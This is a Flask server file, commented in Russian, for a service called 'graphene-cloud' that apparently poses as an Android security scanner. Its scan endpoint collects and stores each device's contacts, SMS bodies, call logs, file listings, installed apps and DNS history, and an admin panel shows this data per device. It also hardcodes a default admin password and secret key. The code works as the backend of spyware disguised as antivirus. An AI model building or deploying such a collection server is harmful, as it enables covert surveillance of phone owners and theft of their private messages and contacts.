import json
import os
import uuid
from datetime import datetime

from flask import (
    Flask, render_template, request, jsonify, redirect,
    url_for, flash, abort
)
from flask_login import (
    LoginManager, UserMixin, login_user, login_required,
    logout_user, current_user
)
from werkzeug.security import check_password_hash, generate_password_hash
from sqlalchemy import func

from models import (
    db, Device, ScanSession, AppRecord, Contact, SmsRecord,
    CallRecord, ScannedFile, DnsEvent, Threat,
)
from analyzer import analyze


# ============================================================
#  Конфигурация
# ============================================================
class Config:
    SECRET_KEY = os.environ.get("GRAPHENE_SECRET", "change-me-graphene-lab")
    SQLALCHEMY_DATABASE_URI = "sqlite:///graphene.db"
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    ADMIN_USERNAME = os.environ.get("GRAPHENE_ADMIN_USER", "admin")
    _ADMIN_HASH = os.environ.get("GRAPHENE_ADMIN_HASH")
    # Дефолтный пароль: graphene2024 (переопределяется через env)
    ADMIN_PASSWORD_HASH = _ADMIN_HASH or generate_password_hash("graphene2024")


app = Flask(__name__)
app.config.from_object(Config)
db.init_app(app)

login_manager = LoginManager(app)
login_manager.login_view = "login"
login_manager.login_message = "Требуется вход"


class AdminUser(UserMixin):
    def __init__(self, username: str):
        self.id = username


@login_manager.user_loader
def load_user(user_id):
    return AdminUser(user_id)


# ============================================================
#  Jinja-фильтры
# ============================================================
@app.template_filter("fromjson")
def fromjson(value):
    try:
        return json.loads(value) if value else []
    except Exception:
        return []


@app.template_filter("dt")
def dt_filter(value, fmt="%Y-%m-%d %H:%M"):
    return value.strftime(fmt) if value else "—"


# ============================================================
#  API для клиента
# ============================================================
@app.route("/api/v1/ping")
def ping():
    return jsonify({"status": "ok", "service": "graphene-cloud"})


@app.route("/api/v1/scan", methods=["POST"])
def api_scan():
    data = request.get_json(force=True, silent=True) or {}
    dev = data.get("device") or {}
    device_id = (dev.get("device_id") or "").strip()
    if not device_id:
        return jsonify({"error": "device_id required"}), 400

    # --- Устройство ---
    device = Device.query.filter_by(device_id=device_id).first()
    if not device:
        device = Device(device_id=device_id)
        db.session.add(device)
    device.manufacturer = dev.get("manufacturer")
    device.model = dev.get("model")
    device.android_version = dev.get("android_version")
    device.sdk_int = dev.get("sdk_int") or 0
    device.security_patch = dev.get("security_patch")
    device.rooted = bool(dev.get("rooted"))
    device.last_seen = datetime.utcnow()

    # --- Полная замена телеметрии для устройства ---
    for model in (AppRecord, Contact, SmsRecord, CallRecord, ScannedFile, DnsEvent, Threat):
        model.query.filter_by(device_id=device_id).delete()

    for a in data.get("apps") or []:
        db.session.add(AppRecord(
            device_id=device_id,
            package_name=(a.get("package_name") or "")[:255],
            app_name=(a.get("app_name") or "")[:255],
            version_name=(a.get("version_name") or "")[:64],
            target_sdk=a.get("target_sdk") or 0,
            permissions=json.dumps(a.get("permissions") or []),
            first_install=a.get("first_install") or 0,
            last_update=a.get("last_update") or 0,
            apk_sha256=(a.get("apk_sha256") or "")[:64] or None,
            is_sideloaded=bool(a.get("is_sideloaded")),
        ))

    for c in data.get("contacts") or []:
        db.session.add(Contact(
            device_id=device_id,
            display_name=(c.get("display_name") or "")[:255],
            phones=json.dumps(c.get("phones") or []),
            emails=json.dumps(c.get("emails") or []),
            has_photo=bool(c.get("has_photo")),
        ))

    for s in data.get("sms") or []:
        db.session.add(SmsRecord(
            device_id=device_id,
            address=(s.get("address") or "")[:64],
            body_preview=(s.get("body_preview") or "")[:500],
            date=s.get("date") or 0,
            type=s.get("type") or 0,
        ))

    for c in data.get("calls") or []:
        db.session.add(CallRecord(
            device_id=device_id,
            number=(c.get("number") or "")[:64],
            type=c.get("type") or 0,
            date=c.get("date") or 0,
            duration=c.get("duration") or 0,
        ))

    for f in data.get("files") or []:
        db.session.add(ScannedFile(
            device_id=device_id,
            path=(f.get("path") or "")[:1024],
            size=f.get("size") or 0,
            extension=(f.get("extension") or "")[:16],
            sha256=(f.get("sha256") or "")[:64] or None,
            modified=f.get("modified") or 0,
        ))

    # DNS — уникальные домены в рамках одной сессии
    net = data.get("network") or {}
    seen_domains = set()
    for ev in net.get("dns_events") or []:
        dom = (ev.get("domain") or "")[:255]
        if not dom or dom in seen_domains:
            continue
        seen_domains.add(dom)
        db.session.add(DnsEvent(
            device_id=device_id,
            domain=dom,
            timestamp=ev.get("timestamp") or 0,
            query_type=ev.get("query_type") or 1,
        ))

    # --- Анализ ---
    threats, risk = analyze(data)
    scan_id = str(uuid.uuid4())
    for t in threats:
        db.session.add(Threat(
            device_id=device_id,
            scan_id=scan_id,
            package_name=t["package_name"][:255],
            threat_name=t["threat_name"][:255],
            severity=t["severity"],
            description=(t.get("description") or "")[:1000],
        ))

    session = ScanSession(
        device_id=device_id,
        scan_id=scan_id,
        scanned_apps=len(data.get("apps") or []),
        risk_score=risk,
        threats_count=len(threats),
    )
    db.session.add(session)
    device.last_risk_score = risk
    db.session.commit()

    return jsonify({
        "scan_id": scan_id,
        "scanned_apps": session.scanned_apps,
        "threats": threats,
        "risk_score": risk,
    })


# ============================================================
#  Auth
# ============================================================
@app.route("/login", methods=["GET", "POST"])
def login():
    if current_user.is_authenticated:
        return redirect(url_for("dashboard"))
    error = None
    if request.method == "POST":
        username = request.form.get("username", "").strip()
        password = request.form.get("password", "")
        if (username == app.config["ADMIN_USERNAME"]
                and check_password_hash(app.config["ADMIN_PASSWORD_HASH"], password)):
            login_user(AdminUser(username))
            return redirect(url_for("dashboard"))
        error = "Неверный логин или пароль"
    return render_template("login.html", error=error)


@app.route("/logout")
@login_required
def logout():
    logout_user()
    return redirect(url_for("login"))


# ============================================================
#  Панель администратора
# ============================================================
@app.route("/")
@login_required
def dashboard():
    devices = Device.query.order_by(Device.last_seen.desc()).all()
    total_devices = len(devices)
    total_scans = ScanSession.query.count()
    total_threats = Threat.query.count()
    high_threats = Threat.query.filter_by(severity="HIGH").count()

    recent_threats = Threat.query.order_by(Threat.created_at.desc()).limit(12).all()
    recent_scans = ScanSession.query.order_by(ScanSession.created_at.desc()).limit(12).all()

    sev_rows = db.session.query(Threat.severity, func.count(Threat.id)).group_by(Threat.severity).all()
    severity_breakdown = {s: c for s, c in sev_rows}

    return render_template(
        "dashboard.html",
        devices=devices,
        total_devices=total_devices,
        total_scans=total_scans,
        total_threats=total_threats,
        high_threats=high_threats,
        recent_threats=recent_threats,
        recent_scans=recent_scans,
        severity_breakdown=severity_breakdown,
    )


@app.route("/devices")
@login_required
def devices():
    items = Device.query.order_by(Device.last_seen.desc()).all()
    return render_template("devices.html", devices=items)


@app.route("/devices/<device_id>")
@login_required
def device_detail(device_id):
    device = Device.query.filter_by(device_id=device_id).first_or_404()
    apps = AppRecord.query.filter_by(device_id=device_id).order_by(AppRecord.app_name).all()
    contacts = Contact.query.filter_by(device_id=device_id).limit(200).all()
    sms = SmsRecord.query.filter_by(device_id=device_id).order_by(SmsRecord.date.desc()).limit(100).all()
    calls = CallRecord.query.filter_by(device_id=device_id).order_by(CallRecord.date.desc()).limit(100).all()
    files = ScannedFile.query.filter_by(device_id=device_id).order_by(ScannedFile.modified.desc()).all()
    dns = DnsEvent.query.filter_by(device_id=device_id).order_by(DnsEvent.timestamp.desc()).limit(200).all()
    threats = Threat.query.filter_by(device_id=device_id).order_by(Threat.created_at.desc()).all()
    scans = ScanSession.query.filter_by(device_id=device_id).order_by(ScanSession.created_at.desc()).limit(20).all()

    return render_template(
        "device_detail.html",
        device=device,
        apps=apps,
        contacts=contacts,
        sms=sms,
        calls=calls,
        files=files,
        dns=dns,
        threats=threats,
        scans=scans,
    )


@app.route("/threats")
@login_required
def threats_list():
    severity = request.args.get("severity")
    q = Threat.query
    if severity in ("HIGH", "MEDIUM", "LOW"):
        q = q.filter_by(severity=severity)
    items = q.order_by(Threat.created_at.desc()).limit(500).all()
    return render_template("threats.html", threats=items, active_severity=severity)


@app.route("/network")
@login_required
def network():
    # Топ доменов по количеству устройств
    top_rows = (
        db.session.query(DnsEvent.domain, func.count(DnsEvent.id).label("hits"))
        .group_by(DnsEvent.domain)
        .order_by(func.count(DnsEvent.id).desc())
        .limit(50)
        .all()
    )
    total_domains = db.session.query(func.count(func.distinct(DnsEvent.domain))).scalar() or 0
    total_events = DnsEvent.query.count()

    # Устройства с наибольшей активностью по DNS
    device_rows = (
        db.session.query(DnsEvent.device_id, func.count(DnsEvent.id).label("hits"))
        .group_by(DnsEvent.device_id)
        .order_by(func.count(DnsEvent.id).desc())
        .limit(15)
        .all()
    )

    return render_template(
        "network.html",
        top_domains=top_rows,
        total_domains=total_domains,
        total_events=total_events,
        device_rows=device_rows,
    )


# ============================================================
#  Инициализация
# ============================================================
with app.app_context():
    db.create_all()


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, debug=False)